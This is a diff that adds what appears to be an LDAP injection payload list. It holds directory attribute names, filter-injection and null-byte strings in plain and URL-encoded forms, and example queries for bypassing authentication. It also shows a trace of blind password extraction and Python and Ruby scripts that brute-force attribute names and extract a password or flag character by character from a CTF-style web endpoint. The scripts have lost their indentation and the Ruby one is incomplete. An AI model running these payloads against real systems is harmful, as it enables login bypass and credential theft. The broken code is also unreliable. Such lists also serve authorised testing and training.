@@ -1,0 +1,115 @@
+c
+cn
+co
+commonName
+dc
+facsimileTelephoneNumber
+givenName
+gn
+homePhone
+id
+jpegPhoto
+l
+mail
+mobile
+name
+o
+objectClass
+ou
+owner
+pager
+password
+sn
+st
+surname
+uid
+username
+userPassword
+*
+*)(&
+*))%00
+*()|%26'
+*()|&'
+*(|(mail=*))
+*(|(objectclass=*))
+*)(uid=*))(|(uid=*
+*/*
+*|
+/
+//
+//*
+@*
+|
+admin*
+admin*)((|userpassword=*)
+admin*)((|userPassword=*)
+x' or name()='username' or 'x'='y
+!
+%21
+%26
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+&
+(
+)
+)(cn=))\x00
+x' or name()='username' or 'x'='ys
+user  = *)(uid=*))(|(uid=*
+pass  = password
+query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
+user  = admin)(!(&(1=0
+pass  = q))
+query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
+(&(sn=administrator)(password=*))    : OK
+(&(sn=administrator)(password=A*))   : KO
+(&(sn=administrator)(password=B*))   : KO
+...
+(&(sn=administrator)(password=M*))   : OK
+(&(sn=administrator)(password=MA*))  : KO
+(&(sn=administrator)(password=MB*))  : KO
+(&(sn=administrator)(password=MY*))  : OK
+(&(sn=administrator)(password=MYA*)) : KO
+(&(sn=administrator)(password=MYB*)) : KO
+(&(sn=administrator)(password=MYC*)) : KO
+(&(sn=administrator)(password=MYK*)) : OK
+(&(sn=administrator)(password=MYKE)) : OK
+userPassword:2.5.13.18:=\xx (\xx is a byte)
+userPassword:2.5.13.18:=\xx\xx
+userPassword:2.5.13.18:=\xx\xx\xx
+import requests
+import string
+fields = []
+url = 'https://URL.com/'
+f = open('dic', 'r')
+world = f.read().split('\n')
+f.close()
+for i in world:
+r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
+if 'TRUE CONDITION' in r.text:
+fields.append(str(i))
+print(fields)
+import requests, string
+alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
+flag = ""
+for i in range(50):
+print("[i] Looking for number " + str(i))
+for char in alphabet:
+r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
+if ("TRUE CONDITION" in r.text):
+flag += char
+print("[+] Flag: " + flag)
+break
+require 'net/http'
+alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')
+flag = ''
+(0..50).each do |i|
+puts("[i] Looking for number #{i}")
+alphabet.each do |char|
+r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
+if /TRUE CONDITION/.match?(r)
+puts("[+] Flag: #{flag}")
+end
